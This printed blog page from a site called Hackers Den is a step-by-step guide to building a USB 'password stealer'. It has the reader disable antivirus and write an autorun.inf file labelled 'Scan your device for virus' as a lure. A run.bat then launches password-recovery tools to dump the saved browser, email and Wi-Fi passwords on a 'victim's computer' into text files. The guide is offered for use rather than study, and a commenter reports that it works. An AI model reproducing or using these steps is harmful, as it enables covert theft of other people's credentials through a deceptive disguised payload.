24/03/2018

How To Make a USB Password Stealer - Hackers Den

How To Make a USB Password
Stealer

  In  this  article  I  will  explain  you  on  how  to  make  a  USB  password
stealer and steal saved passwords.
 Now be  ready to create your own USB password stealer.
 Before going to start  download  following tools :-

https://www.hackersdenabi.net/how-to-make-usb-password-stealer/

1/5

24/03/2018

How To Make a USB Password Stealer - Hackers Den

 ChromePass:-ChromePass is a small password recovery tool

for Windows that allows you to view    the user names  and

passwords stored by Google Chrome Web browser

 Password Fox :- PasswordFox is a small password recovery

tool for Windows that allows you to view the user names and

passwords stored by Mozilla Firefox Web browser.

 Mail PassView:-Recovers the passwords of the  email

programs( i.e gmail,yahoo,Outllok  Express etc).

WebBrowser PassView:- WebBrowserPassView is a password

recovery tool that reveals the passwords stored by the following

Web browsers: Internet Explorer (Version 4.0 – 8.0), Mozilla

Firefox (All Versions), Google Chrome, and Opera. This tool can

be used to recover your lost/forgotten password of any Website,

including popular Web sites, like Facebook, Yahoo, Google, and

GMail, as long as the password is stored by your Web Browser.

After retrieving your lost passwords, you can save them into

text/html/csv/xml file, by using the ‘Save Selected Items’ option

(Ctrl+S).

WirelessKeyView:-WirelessKeyView recovers all wireless

network keys (WEP/WPA) stored in your computer

You can find these and many more tool here .
Note: Kindly disable your antivirus before performing these steps.

Now Follow these steps:-

1.  extract  the  files  you  downloaded  to  your  desktop  and  copy  all  the
.exe files to your USB
2. Create a new Notepad  file and write the following text into it:

https://www.hackersdenabi.net/how-to-make-usb-password-stealer/

2/5

24/03/2018

How To Make a USB Password Stealer - Hackers Den

      [autorun] open=run.bat
     ACTION= Scan your device for virus
   Save the Notepad as autorun.inf
     Now copy the autorun.inf file onto your USB pendrive.
3. Create another Notepad and write the following code onto it.
start ChromePass.exe /stext ChromePass.txt
start mailpv.exe /stext mailpv.txt
start WebBrowserPassView.exe /stext WebBrowserPassView.txt
start WirelessKeyView.exe /stext WirelessKeyView.txt
start PasswordFox.exe /stext passwordfox.txt
save the notepad file as “run.bat”.
Copy the run.bat file also to your USB drive.
Now your USB password stealer is ready. All you have to do is insert it
in your victims computer and a popup will appear, in the popup window
select the option (Scan your device for virus) as soon as you will click
it, your USB password stealer will do it’s magic and all the passwords
saved on the system will be saved in a respective  .txt file.
NOTE:-
1.  this  only  recovers  passwords  that  have  once  been  saved  on  your
computer
2.  note that the computer should not have autorun feature disabled for
the USB stealer to work.
 in that case Manualy open launch .bat and it should work.

Like , Share if this was Helpful ! Comment for any doubts We wiill happy to help you.

Bio

Latest Posts

Ravindra Solanki

Ravindra Solanki is a Software Engineer, passionate to
learn and explore new things about computers and
technology.He loves to write about programming and love
to play with Oracle Database & its queries.he likes to
experiment new technology stuff, and once successful like
to share his knowledge with others.Find Everything about
Ravindra here- www.ravindrasolanki.net

Sharing is sexy:

Share

Tweet

submit

https://www.hackersdenabi.net/how-to-make-usb-password-stealer/

3/5

24/03/2018

How To Make a USB Password Stealer - Hackers Den

Ravindra Solanki

Updated February 18, 2016

Related Posts

 What is

Cryptocurrency ~

 Top 10 Mobile Tracker
Apps That You Should

Everything You Ever Wanted

Have On Your Phone

to Know

 The Best Hacking

Books To Learn Ethical

Hacking

Click Here to Leave a Comment Below

1 comments

msgaming - August 1, 2017

thanks so much this works and is so cool

Reply

Leave a Reply:

https://www.hackersdenabi.net/how-to-make-usb-password-stealer/

4/5

24/03/2018

How To Make a USB Password Stealer - Hackers Den

Name*

Email*

Website

SUBMIT

 Notify me of follow-up comments by email.

 Notify me of new posts by email.

Copyright 2017 | Hackers Den.

https://www.hackersdenabi.net/how-to-make-usb-password-stealer/

5/5

